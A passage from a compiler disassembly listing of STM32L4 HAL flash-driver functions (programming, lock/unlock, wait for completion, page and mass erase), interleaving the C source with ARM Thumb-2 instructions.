 80014f4:	68b8      	ldr	r0, [r7, #8]
 80014f6:	f000 f8bd 	bl	8001674 <FLASH_Program_DoubleWord>
      prog_bit = FLASH_CR_PG;
 80014fa:	2301      	movs	r3, #1
 80014fc:	613b      	str	r3, [r7, #16]
 80014fe:	e010      	b.n	8001522 <HAL_FLASH_Program+0x9a>
    }
    else if((TypeProgram == FLASH_TYPEPROGRAM_FAST) || (TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST))
 8001500:	68fb      	ldr	r3, [r7, #12]
 8001502:	2b01      	cmp	r3, #1
 8001504:	d002      	beq.n	800150c <HAL_FLASH_Program+0x84>
 8001506:	68fb      	ldr	r3, [r7, #12]
 8001508:	2b02      	cmp	r3, #2
 800150a:	d10a      	bne.n	8001522 <HAL_FLASH_Program+0x9a>
    {
      /* Fast program a 32 row double-word (64-bit) at a specified address */
      FLASH_Program_Fast(Address, (uint32_t)Data);
 800150c:	683b      	ldr	r3, [r7, #0]
 800150e:	4619      	mov	r1, r3
 8001510:	68b8      	ldr	r0, [r7, #8]
 8001512:	f000 f8d5 	bl	80016c0 <FLASH_Program_Fast>

      /* If it is the last row, the bit will be cleared at the end of the operation */
      if(TypeProgram == FLASH_TYPEPROGRAM_FAST_AND_LAST)
 8001516:	68fb      	ldr	r3, [r7, #12]
 8001518:	2b02      	cmp	r3, #2
 800151a:	d102      	bne.n	8001522 <HAL_FLASH_Program+0x9a>
      {
        prog_bit = FLASH_CR_FSTPG;
 800151c:	f44f 2380 	mov.w	r3, #262144	; 0x40000
 8001520:	613b      	str	r3, [r7, #16]
    {
      /* Nothing to do */
    }

    /* Wait for last operation to be completed */
    status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001522:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001526:	f000 f84d 	bl	80015c4 <FLASH_WaitForLastOperation>
 800152a:	4603      	mov	r3, r0
 800152c:	75fb      	strb	r3, [r7, #23]

    /* If the program operation is completed, disable the PG or FSTPG Bit */
    if (prog_bit != 0U)
 800152e:	693b      	ldr	r3, [r7, #16]
 8001530:	2b00      	cmp	r3, #0
 8001532:	d006      	beq.n	8001542 <HAL_FLASH_Program+0xba>
    {
      CLEAR_BIT(FLASH->CR, prog_bit);
 8001534:	4b09      	ldr	r3, [pc, #36]	; (800155c <HAL_FLASH_Program+0xd4>)
 8001536:	695a      	ldr	r2, [r3, #20]
 8001538:	693b      	ldr	r3, [r7, #16]
 800153a:	43db      	mvns	r3, r3
 800153c:	4907      	ldr	r1, [pc, #28]	; (800155c <HAL_FLASH_Program+0xd4>)
 800153e:	4013      	ands	r3, r2
 8001540:	614b      	str	r3, [r1, #20]
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 8001542:	f000 f9cf 	bl	80018e4 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 8001546:	4b04      	ldr	r3, [pc, #16]	; (8001558 <HAL_FLASH_Program+0xd0>)
 8001548:	2200      	movs	r2, #0
 800154a:	701a      	strb	r2, [r3, #0]

  return status;
 800154c:	7dfb      	ldrb	r3, [r7, #23]
}
 800154e:	4618      	mov	r0, r3
 8001550:	3718      	adds	r7, #24
 8001552:	46bd      	mov	sp, r7
 8001554:	bd80      	pop	{r7, pc}
 8001556:	bf00      	nop
 8001558:	2000000c 	.word	0x2000000c
 800155c:	40022000 	.word	0x40022000

08001560 <HAL_FLASH_Unlock>:
/**
  * @brief  Unlock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Unlock(void)
{
 8001560:	b480      	push	{r7}
 8001562:	b083      	sub	sp, #12
 8001564:	af00      	add	r7, sp, #0
  HAL_StatusTypeDef status = HAL_OK;
 8001566:	2300      	movs	r3, #0
 8001568:	71fb      	strb	r3, [r7, #7]

  if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 800156a:	4b0b      	ldr	r3, [pc, #44]	; (8001598 <HAL_FLASH_Unlock+0x38>)
 800156c:	695b      	ldr	r3, [r3, #20]
 800156e:	2b00      	cmp	r3, #0
 8001570:	da0b      	bge.n	800158a <HAL_FLASH_Unlock+0x2a>
  {
    /* Authorize the FLASH Registers access */
    WRITE_REG(FLASH->KEYR, FLASH_KEY1);
 8001572:	4b09      	ldr	r3, [pc, #36]	; (8001598 <HAL_FLASH_Unlock+0x38>)
 8001574:	4a09      	ldr	r2, [pc, #36]	; (800159c <HAL_FLASH_Unlock+0x3c>)
 8001576:	609a      	str	r2, [r3, #8]
    WRITE_REG(FLASH->KEYR, FLASH_KEY2);
 8001578:	4b07      	ldr	r3, [pc, #28]	; (8001598 <HAL_FLASH_Unlock+0x38>)
 800157a:	4a09      	ldr	r2, [pc, #36]	; (80015a0 <HAL_FLASH_Unlock+0x40>)
 800157c:	609a      	str	r2, [r3, #8]

    /* Verify Flash is unlocked */
    if(READ_BIT(FLASH->CR, FLASH_CR_LOCK) != 0U)
 800157e:	4b06      	ldr	r3, [pc, #24]	; (8001598 <HAL_FLASH_Unlock+0x38>)
 8001580:	695b      	ldr	r3, [r3, #20]
 8001582:	2b00      	cmp	r3, #0
 8001584:	da01      	bge.n	800158a <HAL_FLASH_Unlock+0x2a>
    {
      status = HAL_ERROR;
 8001586:	2301      	movs	r3, #1
 8001588:	71fb      	strb	r3, [r7, #7]
    }
  }

  return status;
 800158a:	79fb      	ldrb	r3, [r7, #7]
}
 800158c:	4618      	mov	r0, r3
 800158e:	370c      	adds	r7, #12
 8001590:	46bd      	mov	sp, r7
 8001592:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001596:	4770      	bx	lr
 8001598:	40022000 	.word	0x40022000
 800159c:	45670123 	.word	0x45670123
 80015a0:	cdef89ab 	.word	0xcdef89ab

080015a4 <HAL_FLASH_Lock>:
/**
  * @brief  Lock the FLASH control register access.
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASH_Lock(void)
{
 80015a4:	b480      	push	{r7}
 80015a6:	af00      	add	r7, sp, #0
  /* Set the LOCK Bit to lock the FLASH Registers access */
  SET_BIT(FLASH->CR, FLASH_CR_LOCK);
 80015a8:	4b05      	ldr	r3, [pc, #20]	; (80015c0 <HAL_FLASH_Lock+0x1c>)
 80015aa:	695b      	ldr	r3, [r3, #20]
 80015ac:	4a04      	ldr	r2, [pc, #16]	; (80015c0 <HAL_FLASH_Lock+0x1c>)
 80015ae:	f043 4300 	orr.w	r3, r3, #2147483648	; 0x80000000
 80015b2:	6153      	str	r3, [r2, #20]

  return HAL_OK;
 80015b4:	2300      	movs	r3, #0
}
 80015b6:	4618      	mov	r0, r3
 80015b8:	46bd      	mov	sp, r7
 80015ba:	f85d 7b04 	ldr.w	r7, [sp], #4
 80015be:	4770      	bx	lr
 80015c0:	40022000 	.word	0x40022000

080015c4 <FLASH_WaitForLastOperation>:
  * @brief  Wait for a FLASH operation to complete.
  * @param  Timeout maximum flash operation timeout
  * @retval HAL_StatusTypeDef HAL Status
  */
HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)
{
 80015c4:	b580      	push	{r7, lr}
 80015c6:	b084      	sub	sp, #16
 80015c8:	af00      	add	r7, sp, #0
 80015ca:	6078      	str	r0, [r7, #4]
  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.
     Even if the FLASH operation fails, the BUSY flag will be reset and an error
     flag will be set */

  uint32_t tickstart = HAL_GetTick();
 80015cc:	f7ff fe1a 	bl	8001204 <HAL_GetTick>
 80015d0:	60f8      	str	r0, [r7, #12]
  uint32_t error;

  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 80015d2:	e00d      	b.n	80015f0 <FLASH_WaitForLastOperation+0x2c>
  {
    if(Timeout != HAL_MAX_DELAY)
 80015d4:	687b      	ldr	r3, [r7, #4]
 80015d6:	f1b3 3fff 	cmp.w	r3, #4294967295
 80015da:	d009      	beq.n	80015f0 <FLASH_WaitForLastOperation+0x2c>
    {
      if((HAL_GetTick() - tickstart) >= Timeout)
 80015dc:	f7ff fe12 	bl	8001204 <HAL_GetTick>
 80015e0:	4602      	mov	r2, r0
 80015e2:	68fb      	ldr	r3, [r7, #12]
 80015e4:	1ad3      	subs	r3, r2, r3
 80015e6:	687a      	ldr	r2, [r7, #4]
 80015e8:	429a      	cmp	r2, r3
 80015ea:	d801      	bhi.n	80015f0 <FLASH_WaitForLastOperation+0x2c>
      {
        return HAL_TIMEOUT;
 80015ec:	2303      	movs	r3, #3
 80015ee:	e036      	b.n	800165e <FLASH_WaitForLastOperation+0x9a>
  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY))
 80015f0:	4b1d      	ldr	r3, [pc, #116]	; (8001668 <FLASH_WaitForLastOperation+0xa4>)
 80015f2:	691b      	ldr	r3, [r3, #16]
 80015f4:	f403 3380 	and.w	r3, r3, #65536	; 0x10000
 80015f8:	2b00      	cmp	r3, #0
 80015fa:	d1eb      	bne.n	80015d4 <FLASH_WaitForLastOperation+0x10>
      }
    }
  }

  error = (FLASH->SR & FLASH_FLAG_SR_ERRORS);
 80015fc:	4b1a      	ldr	r3, [pc, #104]	; (8001668 <FLASH_WaitForLastOperation+0xa4>)
 80015fe:	691a      	ldr	r2, [r3, #16]
 8001600:	4b1a      	ldr	r3, [pc, #104]	; (800166c <FLASH_WaitForLastOperation+0xa8>)
 8001602:	4013      	ands	r3, r2
 8001604:	60bb      	str	r3, [r7, #8]

  if(error != 0u)
 8001606:	68bb      	ldr	r3, [r7, #8]
 8001608:	2b00      	cmp	r3, #0
 800160a:	d01e      	beq.n	800164a <FLASH_WaitForLastOperation+0x86>
  {
    /*Save the error code*/
    pFlash.ErrorCode |= error;
 800160c:	4b18      	ldr	r3, [pc, #96]	; (8001670 <FLASH_WaitForLastOperation+0xac>)
 800160e:	685a      	ldr	r2, [r3, #4]
 8001610:	68bb      	ldr	r3, [r7, #8]
 8001612:	4313      	orrs	r3, r2
 8001614:	4a16      	ldr	r2, [pc, #88]	; (8001670 <FLASH_WaitForLastOperation+0xac>)
 8001616:	6053      	str	r3, [r2, #4]

    /* Clear error programming flags */
    __HAL_FLASH_CLEAR_FLAG(error);
 8001618:	68bb      	ldr	r3, [r7, #8]
 800161a:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 800161e:	2b00      	cmp	r3, #0
 8001620:	d007      	beq.n	8001632 <FLASH_WaitForLastOperation+0x6e>
 8001622:	4b11      	ldr	r3, [pc, #68]	; (8001668 <FLASH_WaitForLastOperation+0xa4>)
 8001624:	699a      	ldr	r2, [r3, #24]
 8001626:	68bb      	ldr	r3, [r7, #8]
 8001628:	f003 4340 	and.w	r3, r3, #3221225472	; 0xc0000000
 800162c:	490e      	ldr	r1, [pc, #56]	; (8001668 <FLASH_WaitForLastOperation+0xa4>)
 800162e:	4313      	orrs	r3, r2
 8001630:	618b      	str	r3, [r1, #24]
 8001632:	68bb      	ldr	r3, [r7, #8]
 8001634:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 8001638:	2b00      	cmp	r3, #0
 800163a:	d004      	beq.n	8001646 <FLASH_WaitForLastOperation+0x82>
 800163c:	4a0a      	ldr	r2, [pc, #40]	; (8001668 <FLASH_WaitForLastOperation+0xa4>)
 800163e:	68bb      	ldr	r3, [r7, #8]
 8001640:	f023 4340 	bic.w	r3, r3, #3221225472	; 0xc0000000
 8001644:	6113      	str	r3, [r2, #16]

    return HAL_ERROR;
 8001646:	2301      	movs	r3, #1
 8001648:	e009      	b.n	800165e <FLASH_WaitForLastOperation+0x9a>
  }

  /* Check FLASH End of Operation flag  */
  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))
 800164a:	4b07      	ldr	r3, [pc, #28]	; (8001668 <FLASH_WaitForLastOperation+0xa4>)
 800164c:	691b      	ldr	r3, [r3, #16]
 800164e:	f003 0301 	and.w	r3, r3, #1
 8001652:	2b00      	cmp	r3, #0
 8001654:	d002      	beq.n	800165c <FLASH_WaitForLastOperation+0x98>
  {
    /* Clear FLASH End of Operation pending bit */
    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);
 8001656:	4b04      	ldr	r3, [pc, #16]	; (8001668 <FLASH_WaitForLastOperation+0xa4>)
 8001658:	2201      	movs	r2, #1
 800165a:	611a      	str	r2, [r3, #16]
  }

  /* If there is an error flag set */
  return HAL_OK;
 800165c:	2300      	movs	r3, #0
}
 800165e:	4618      	mov	r0, r3
 8001660:	3710      	adds	r7, #16
 8001662:	46bd      	mov	sp, r7
 8001664:	bd80      	pop	{r7, pc}
 8001666:	bf00      	nop
 8001668:	40022000 	.word	0x40022000
 800166c:	0002c3fa 	.word	0x0002c3fa
 8001670:	2000000c 	.word	0x2000000c

08001674 <FLASH_Program_DoubleWord>:
  * @param  Address specifies the address to be programmed.
  * @param  Data specifies the data to be programmed.
  * @retval None
  */
static void FLASH_Program_DoubleWord(uint32_t Address, uint64_t Data)
{
 8001674:	b480      	push	{r7}
 8001676:	b085      	sub	sp, #20
 8001678:	af00      	add	r7, sp, #0
 800167a:	60f8      	str	r0, [r7, #12]
 800167c:	e9c7 2300 	strd	r2, r3, [r7]
  /* Check the parameters */
  assert_param(IS_FLASH_PROGRAM_ADDRESS(Address));

  /* Set PG bit */
  SET_BIT(FLASH->CR, FLASH_CR_PG);
 8001680:	4b0e      	ldr	r3, [pc, #56]	; (80016bc <FLASH_Program_DoubleWord+0x48>)
 8001682:	695b      	ldr	r3, [r3, #20]
 8001684:	4a0d      	ldr	r2, [pc, #52]	; (80016bc <FLASH_Program_DoubleWord+0x48>)
 8001686:	f043 0301 	orr.w	r3, r3, #1
 800168a:	6153      	str	r3, [r2, #20]

  /* Program first word */
  *(__IO uint32_t*)Address = (uint32_t)Data;
 800168c:	68fb      	ldr	r3, [r7, #12]
 800168e:	683a      	ldr	r2, [r7, #0]
 8001690:	601a      	str	r2, [r3, #0]
           so that all instructions following the ISB are fetched from cache or memory,
           after the instruction has been completed.
 */
__STATIC_FORCEINLINE void __ISB(void)
{
  __ASM volatile ("isb 0xF":::"memory");
 8001692:	f3bf 8f6f 	isb	sy
}
 8001696:	bf00      	nop
  /* Barrier to ensure programming is performed in 2 steps, in right order
    (independently of compiler optimization behavior) */
  __ISB();

  /* Program second word */
  *(__IO uint32_t*)(Address+4U) = (uint32_t)(Data >> 32);
 8001698:	e9d7 0100 	ldrd	r0, r1, [r7]
 800169c:	f04f 0200 	mov.w	r2, #0
 80016a0:	f04f 0300 	mov.w	r3, #0
 80016a4:	000a      	movs	r2, r1
 80016a6:	2300      	movs	r3, #0
 80016a8:	68f9      	ldr	r1, [r7, #12]
 80016aa:	3104      	adds	r1, #4
 80016ac:	4613      	mov	r3, r2
 80016ae:	600b      	str	r3, [r1, #0]
}
 80016b0:	bf00      	nop
 80016b2:	3714      	adds	r7, #20
 80016b4:	46bd      	mov	sp, r7
 80016b6:	f85d 7b04 	ldr.w	r7, [sp], #4
 80016ba:	4770      	bx	lr
 80016bc:	40022000 	.word	0x40022000

080016c0 <FLASH_Program_Fast>:
  * @param  Address specifies the address to be programmed.
  * @param  DataAddress specifies the address where the data are stored.
  * @retval None
  */
static void FLASH_Program_Fast(uint32_t Address, uint32_t DataAddress)
{
 80016c0:	b480      	push	{r7}
 80016c2:	b089      	sub	sp, #36	; 0x24
 80016c4:	af00      	add	r7, sp, #0
 80016c6:	6078      	str	r0, [r7, #4]
 80016c8:	6039      	str	r1, [r7, #0]
  uint32_t primask_bit;
  uint8_t row_index = (2*FLASH_NB_DOUBLE_WORDS_IN_ROW);
 80016ca:	2340      	movs	r3, #64	; 0x40
 80016cc:	77fb      	strb	r3, [r7, #31]
  __IO uint32_t *dest_addr = (__IO uint32_t*)Address;
 80016ce:	687b      	ldr	r3, [r7, #4]
 80016d0:	61bb      	str	r3, [r7, #24]
  __IO uint32_t *src_addr = (__IO uint32_t*)DataAddress;
 80016d2:	683b      	ldr	r3, [r7, #0]
 80016d4:	617b      	str	r3, [r7, #20]

  /* Check the parameters */
  assert_param(IS_FLASH_MAIN_MEM_ADDRESS(Address));

  /* Set FSTPG bit */
  SET_BIT(FLASH->CR, FLASH_CR_FSTPG);
 80016d6:	4b14      	ldr	r3, [pc, #80]	; (8001728 <FLASH_Program_Fast+0x68>)
 80016d8:	695b      	ldr	r3, [r3, #20]
 80016da:	4a13      	ldr	r2, [pc, #76]	; (8001728 <FLASH_Program_Fast+0x68>)
 80016dc:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 80016e0:	6153      	str	r3, [r2, #20]
  __ASM volatile ("MRS %0, primask" : "=r" (result) :: "memory");
 80016e2:	f3ef 8310 	mrs	r3, PRIMASK
 80016e6:	60fb      	str	r3, [r7, #12]
  return(result);
 80016e8:	68fb      	ldr	r3, [r7, #12]

  /* Disable interrupts to avoid any interruption during the loop */
  primask_bit = __get_PRIMASK();
 80016ea:	613b      	str	r3, [r7, #16]
  __ASM volatile ("cpsid i" : : : "memory");
 80016ec:	b672      	cpsid	i
}
 80016ee:	bf00      	nop
  __disable_irq();

  /* Program the double word of the row */
  do
  {
    *dest_addr = *src_addr;
 80016f0:	697b      	ldr	r3, [r7, #20]
 80016f2:	681a      	ldr	r2, [r3, #0]
 80016f4:	69bb      	ldr	r3, [r7, #24]
 80016f6:	601a      	str	r2, [r3, #0]
    dest_addr++;
 80016f8:	69bb      	ldr	r3, [r7, #24]
 80016fa:	3304      	adds	r3, #4
 80016fc:	61bb      	str	r3, [r7, #24]
    src_addr++;
 80016fe:	697b      	ldr	r3, [r7, #20]
 8001700:	3304      	adds	r3, #4
 8001702:	617b      	str	r3, [r7, #20]
    row_index--;
 8001704:	7ffb      	ldrb	r3, [r7, #31]
 8001706:	3b01      	subs	r3, #1
 8001708:	77fb      	strb	r3, [r7, #31]
  } while (row_index != 0U);
 800170a:	7ffb      	ldrb	r3, [r7, #31]
 800170c:	2b00      	cmp	r3, #0
 800170e:	d1ef      	bne.n	80016f0 <FLASH_Program_Fast+0x30>
 8001710:	693b      	ldr	r3, [r7, #16]
 8001712:	60bb      	str	r3, [r7, #8]
  __ASM volatile ("MSR primask, %0" : : "r" (priMask) : "memory");
 8001714:	68bb      	ldr	r3, [r7, #8]
 8001716:	f383 8810 	msr	PRIMASK, r3
}
 800171a:	bf00      	nop

  /* Re-enable the interrupts */
  __set_PRIMASK(primask_bit);
}
 800171c:	bf00      	nop
 800171e:	3724      	adds	r7, #36	; 0x24
 8001720:	46bd      	mov	sp, r7
 8001722:	f85d 7b04 	ldr.w	r7, [sp], #4
 8001726:	4770      	bx	lr
 8001728:	40022000 	.word	0x40022000

0800172c <HAL_FLASHEx_Erase>:
  *         the pages have been correctly erased)
  *
  * @retval HAL Status
  */
HAL_StatusTypeDef HAL_FLASHEx_Erase(FLASH_EraseInitTypeDef *pEraseInit, uint32_t *PageError)
{
 800172c:	b580      	push	{r7, lr}
 800172e:	b084      	sub	sp, #16
 8001730:	af00      	add	r7, sp, #0
 8001732:	6078      	str	r0, [r7, #4]
 8001734:	6039      	str	r1, [r7, #0]
  HAL_StatusTypeDef status;
  uint32_t page_index;

  /* Process Locked */
  __HAL_LOCK(&pFlash);
 8001736:	4b48      	ldr	r3, [pc, #288]	; (8001858 <HAL_FLASHEx_Erase+0x12c>)
 8001738:	781b      	ldrb	r3, [r3, #0]
 800173a:	2b01      	cmp	r3, #1
 800173c:	d101      	bne.n	8001742 <HAL_FLASHEx_Erase+0x16>
 800173e:	2302      	movs	r3, #2
 8001740:	e085      	b.n	800184e <HAL_FLASHEx_Erase+0x122>
 8001742:	4b45      	ldr	r3, [pc, #276]	; (8001858 <HAL_FLASHEx_Erase+0x12c>)
 8001744:	2201      	movs	r2, #1
 8001746:	701a      	strb	r2, [r3, #0]

  /* Check the parameters */
  assert_param(IS_FLASH_TYPEERASE(pEraseInit->TypeErase));

  /* Wait for last operation to be completed */
  status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001748:	f24c 3050 	movw	r0, #50000	; 0xc350
 800174c:	f7ff ff3a 	bl	80015c4 <FLASH_WaitForLastOperation>
 8001750:	4603      	mov	r3, r0
 8001752:	73fb      	strb	r3, [r7, #15]

  if (status == HAL_OK)
 8001754:	7bfb      	ldrb	r3, [r7, #15]
 8001756:	2b00      	cmp	r3, #0
 8001758:	d175      	bne.n	8001846 <HAL_FLASHEx_Erase+0x11a>
  {
    pFlash.ErrorCode = HAL_FLASH_ERROR_NONE;
 800175a:	4b3f      	ldr	r3, [pc, #252]	; (8001858 <HAL_FLASHEx_Erase+0x12c>)
 800175c:	2200      	movs	r2, #0
 800175e:	605a      	str	r2, [r3, #4]

    /* Deactivate the cache if they are activated to avoid data misbehavior */
    if(READ_BIT(FLASH->ACR, FLASH_ACR_ICEN) != 0U)
 8001760:	4b3e      	ldr	r3, [pc, #248]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 8001762:	681b      	ldr	r3, [r3, #0]
 8001764:	f403 7300 	and.w	r3, r3, #512	; 0x200
 8001768:	2b00      	cmp	r3, #0
 800176a:	d013      	beq.n	8001794 <HAL_FLASHEx_Erase+0x68>
    {
      if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 800176c:	4b3b      	ldr	r3, [pc, #236]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 800176e:	681b      	ldr	r3, [r3, #0]
 8001770:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8001774:	2b00      	cmp	r3, #0
 8001776:	d009      	beq.n	800178c <HAL_FLASHEx_Erase+0x60>
      {
        /* Disable data cache  */
        __HAL_FLASH_DATA_CACHE_DISABLE();
 8001778:	4b38      	ldr	r3, [pc, #224]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 800177a:	681b      	ldr	r3, [r3, #0]
 800177c:	4a37      	ldr	r2, [pc, #220]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 800177e:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 8001782:	6013      	str	r3, [r2, #0]
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_DCACHE_ENABLED;
 8001784:	4b34      	ldr	r3, [pc, #208]	; (8001858 <HAL_FLASHEx_Erase+0x12c>)
 8001786:	2203      	movs	r2, #3
 8001788:	771a      	strb	r2, [r3, #28]
 800178a:	e016      	b.n	80017ba <HAL_FLASHEx_Erase+0x8e>
      }
      else
      {
        pFlash.CacheToReactivate = FLASH_CACHE_ICACHE_ENABLED;
 800178c:	4b32      	ldr	r3, [pc, #200]	; (8001858 <HAL_FLASHEx_Erase+0x12c>)
 800178e:	2201      	movs	r2, #1
 8001790:	771a      	strb	r2, [r3, #28]
 8001792:	e012      	b.n	80017ba <HAL_FLASHEx_Erase+0x8e>
      }
    }
    else if(READ_BIT(FLASH->ACR, FLASH_ACR_DCEN) != 0U)
 8001794:	4b31      	ldr	r3, [pc, #196]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 8001796:	681b      	ldr	r3, [r3, #0]
 8001798:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 800179c:	2b00      	cmp	r3, #0
 800179e:	d009      	beq.n	80017b4 <HAL_FLASHEx_Erase+0x88>
    {
      /* Disable data cache  */
      __HAL_FLASH_DATA_CACHE_DISABLE();
 80017a0:	4b2e      	ldr	r3, [pc, #184]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 80017a2:	681b      	ldr	r3, [r3, #0]
 80017a4:	4a2d      	ldr	r2, [pc, #180]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 80017a6:	f423 6380 	bic.w	r3, r3, #1024	; 0x400
 80017aa:	6013      	str	r3, [r2, #0]
      pFlash.CacheToReactivate = FLASH_CACHE_DCACHE_ENABLED;
 80017ac:	4b2a      	ldr	r3, [pc, #168]	; (8001858 <HAL_FLASHEx_Erase+0x12c>)
 80017ae:	2202      	movs	r2, #2
 80017b0:	771a      	strb	r2, [r3, #28]
 80017b2:	e002      	b.n	80017ba <HAL_FLASHEx_Erase+0x8e>
    }
    else
    {
      pFlash.CacheToReactivate = FLASH_CACHE_DISABLED;
 80017b4:	4b28      	ldr	r3, [pc, #160]	; (8001858 <HAL_FLASHEx_Erase+0x12c>)
 80017b6:	2200      	movs	r2, #0
 80017b8:	771a      	strb	r2, [r3, #28]
    }

    if (pEraseInit->TypeErase == FLASH_TYPEERASE_MASSERASE)
 80017ba:	687b      	ldr	r3, [r7, #4]
 80017bc:	681b      	ldr	r3, [r3, #0]
 80017be:	2b01      	cmp	r3, #1
 80017c0:	d111      	bne.n	80017e6 <HAL_FLASHEx_Erase+0xba>
    {
      /* Mass erase to be done */
      FLASH_MassErase(pEraseInit->Banks);
 80017c2:	687b      	ldr	r3, [r7, #4]
 80017c4:	685b      	ldr	r3, [r3, #4]
 80017c6:	4618      	mov	r0, r3
 80017c8:	f000 f84a 	bl	8001860 <FLASH_MassErase>

      /* Wait for last operation to be completed */
      status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 80017cc:	f24c 3050 	movw	r0, #50000	; 0xc350
 80017d0:	f7ff fef8 	bl	80015c4 <FLASH_WaitForLastOperation>
 80017d4:	4603      	mov	r3, r0
 80017d6:	73fb      	strb	r3, [r7, #15]
    defined (STM32L4R5xx) || defined (STM32L4R7xx) || defined (STM32L4R9xx) || defined (STM32L4S5xx) || defined (STM32L4S7xx) || defined (STM32L4S9xx)
      /* If the erase operation is completed, disable the MER1 and MER2 Bits */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1 | FLASH_CR_MER2));
#else
      /* If the erase operation is completed, disable the MER1 Bit */
      CLEAR_BIT(FLASH->CR, (FLASH_CR_MER1));
 80017d8:	4b20      	ldr	r3, [pc, #128]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 80017da:	695b      	ldr	r3, [r3, #20]
 80017dc:	4a1f      	ldr	r2, [pc, #124]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 80017de:	f023 0304 	bic.w	r3, r3, #4
 80017e2:	6153      	str	r3, [r2, #20]
 80017e4:	e02d      	b.n	8001842 <HAL_FLASHEx_Erase+0x116>
#endif
    }
    else
    {
      /*Initialization of PageError variable*/
      *PageError = 0xFFFFFFFFU;
 80017e6:	683b      	ldr	r3, [r7, #0]
 80017e8:	f04f 32ff 	mov.w	r2, #4294967295
 80017ec:	601a      	str	r2, [r3, #0]

      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 80017ee:	687b      	ldr	r3, [r7, #4]
 80017f0:	689b      	ldr	r3, [r3, #8]
 80017f2:	60bb      	str	r3, [r7, #8]
 80017f4:	e01d      	b.n	8001832 <HAL_FLASHEx_Erase+0x106>
      {
        FLASH_PageErase(page_index, pEraseInit->Banks);
 80017f6:	687b      	ldr	r3, [r7, #4]
 80017f8:	685b      	ldr	r3, [r3, #4]
 80017fa:	4619      	mov	r1, r3
 80017fc:	68b8      	ldr	r0, [r7, #8]
 80017fe:	f000 f84d 	bl	800189c <FLASH_PageErase>

        /* Wait for last operation to be completed */
        status = FLASH_WaitForLastOperation((uint32_t)FLASH_TIMEOUT_VALUE);
 8001802:	f24c 3050 	movw	r0, #50000	; 0xc350
 8001806:	f7ff fedd 	bl	80015c4 <FLASH_WaitForLastOperation>
 800180a:	4603      	mov	r3, r0
 800180c:	73fb      	strb	r3, [r7, #15]

        /* If the erase operation is completed, disable the PER Bit */
        CLEAR_BIT(FLASH->CR, (FLASH_CR_PER | FLASH_CR_PNB));
 800180e:	4b13      	ldr	r3, [pc, #76]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 8001810:	695b      	ldr	r3, [r3, #20]
 8001812:	4a12      	ldr	r2, [pc, #72]	; (800185c <HAL_FLASHEx_Erase+0x130>)
 8001814:	f423 737e 	bic.w	r3, r3, #1016	; 0x3f8
 8001818:	f023 0302 	bic.w	r3, r3, #2
 800181c:	6153      	str	r3, [r2, #20]

        if (status != HAL_OK)
 800181e:	7bfb      	ldrb	r3, [r7, #15]
 8001820:	2b00      	cmp	r3, #0
 8001822:	d003      	beq.n	800182c <HAL_FLASHEx_Erase+0x100>
        {
          /* In case of error, stop erase procedure and return the faulty address */
          *PageError = page_index;
 8001824:	683b      	ldr	r3, [r7, #0]
 8001826:	68ba      	ldr	r2, [r7, #8]
 8001828:	601a      	str	r2, [r3, #0]
          break;
 800182a:	e00a      	b.n	8001842 <HAL_FLASHEx_Erase+0x116>
      for(page_index = pEraseInit->Page; page_index < (pEraseInit->Page + pEraseInit->NbPages); page_index++)
 800182c:	68bb      	ldr	r3, [r7, #8]
 800182e:	3301      	adds	r3, #1
 8001830:	60bb      	str	r3, [r7, #8]
 8001832:	687b      	ldr	r3, [r7, #4]
 8001834:	689a      	ldr	r2, [r3, #8]
 8001836:	687b      	ldr	r3, [r7, #4]
 8001838:	68db      	ldr	r3, [r3, #12]
 800183a:	4413      	add	r3, r2
 800183c:	68ba      	ldr	r2, [r7, #8]
 800183e:	429a      	cmp	r2, r3
 8001840:	d3d9      	bcc.n	80017f6 <HAL_FLASHEx_Erase+0xca>
        }
      }
    }

    /* Flush the caches to be sure of the data consistency */
    FLASH_FlushCaches();
 8001842:	f000 f84f 	bl	80018e4 <FLASH_FlushCaches>
  }

  /* Process Unlocked */
  __HAL_UNLOCK(&pFlash);
 8001846:	4b04      	ldr	r3, [pc, #16]	; (8001858 <HAL_FLASHEx_Erase+0x12c>)
 8001848:	2200      	movs	r2, #0
 800184a:	701a      	strb	r2, [r3, #0]

  return status;
 800184c:	7bfb      	ldrb	r3, [r7, #15]
}
 800184e:	4618      	mov	r0, r3
 8001850:	3710      	adds	r7, #16
